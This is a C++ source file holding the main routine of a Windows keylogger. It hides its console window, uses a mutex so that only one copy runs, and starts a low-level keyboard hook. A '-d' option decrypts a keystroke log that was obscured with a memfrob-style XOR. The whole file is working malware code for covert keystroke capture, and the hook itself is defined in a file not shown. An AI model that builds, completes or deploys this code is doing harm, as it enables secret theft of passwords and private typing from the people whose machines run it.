#include <Windows.h>
#include <Shlobj.h>
#include "Common.h"
#include <iostream>

static wchar_t const* mutexName = L"KeyloggerMutex";
static wchar_t const* usagePattern = L"Usage: %s -d [KEYLOG_FILE]\n\
    \t-d KEYLOG_FILE    - decrypt the KEYLOG_FILE\n\
";

wchar_t const* logkeyFile = NULL;
int decryptFlag = 0;

// hide the terminal window
void hideConsole() {
    HWND hWnd = GetConsoleWindow();
    if (hWnd != NULL) {
        ShowWindow(hWnd, SW_HIDE);
    }
}

void usage(wchar_t const** argv, int errCode) {
    wprintf(usagePattern, argv[0]);
    exit(errCode);
}

// entrypoint
int wmain(int argc, wchar_t const** argv) {
    HANDLE hMutex = NULL;
    HANDLE hrFile = NULL;
    HANDLE hwFile = NULL;

    // parsing arguments
    if (argc > 1) {
        for (int i = 1; i < argc; ++i) {
            if (wcslen(argv[i]) == 2 && (argv[i][0] == L'-' || argv[i][0] == L'/')) {
                switch (argv[i][1]) {
                case L'h':
                    usage(argv, 0);
                    break;
                case L'd':
                    decryptFlag = 1;
                    logkeyFile = argv[++i];
                    if (logkeyFile == NULL) {
                        usage(argv, 1);
                    }
                    break;
                }
            }
        }
    }
    
    if (decryptFlag) {
        wchar_t* hwFilePath = NULL;
        wchar_t const* decryptedFile = L"decrypted.txt";
        int slashAt = 0;
        BYTE buffer[BUFSIZE];
        DWORD nread = 0;
        DWORD nwrite = 0;

        hrFile = CreateFile(logkeyFile, FILE_READ_DATA, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hrFile == INVALID_HANDLE_VALUE) {
            printError("Cannot open your file");
            return 1;
        }
        hwFilePath = _wcsdup(logkeyFile);
        if (hwFilePath == NULL) {
            printError("in _wcsdup");
            return 1;
        }
        slashAt = wcslen(hwFilePath)-1;

        while (slashAt >= 0 && hwFilePath[slashAt] != L'\\') {
            slashAt -= 1;
        }

        hwFilePath[slashAt+1] = NULL;
        int expanedElements = wcslen(hwFilePath) + wcslen(decryptedFile) + 1;
        hwFilePath = (wchar_t*)realloc(hwFilePath, expanedElements*sizeof(wchar_t));
        if (hwFilePath == NULL) {
            printError("in realloc");
            return 1;
        }
        wcscat_s(hwFilePath, expanedElements, decryptedFile);


        hwFile = CreateFile(hwFilePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (GetLastError() == ERROR_FILE_NOT_FOUND) {
            hwFile = CreateFile(hwFilePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
        }
        if (hwFile == INVALID_HANDLE_VALUE) {
            printError("Cannot create decrypted file");
            return 1;
        }
        do {
            if (!ReadFile(hrFile, buffer, BUFSIZE, &nread, NULL)) {
                printError("in ReadFile");
                return 1;
            }
            memfrob_like((char*)buffer, nread);
            if (nread > 0){
                if (!WriteFile(hwFile, buffer, nread, &nwrite, NULL) || nread!=nwrite) {
                    printError("in WriteFile");
                    return 1;
                }
            }
        } while (nread > 0);

        wprintf(L"decrypted to %s\n", hwFilePath);

        CloseHandle(hrFile);
        CloseHandle(hwFile);
        return 0;
    }

    // ensure only one instance
    hMutex = OpenMutex(SYNCHRONIZE, FALSE, mutexName);
    if (hMutex != NULL) {
        return 1;
    }
    hMutex = CreateMutex(
        NULL,              // default security attributes
        FALSE,             // initially not owned
        mutexName);
    if (hMutex != NULL)
        ReleaseMutex(hMutex);
    
    hideConsole();
    
    usingLowLevelKeyboardHook();
    // usingHighLevelKeyboardHook();
    return 0;
}
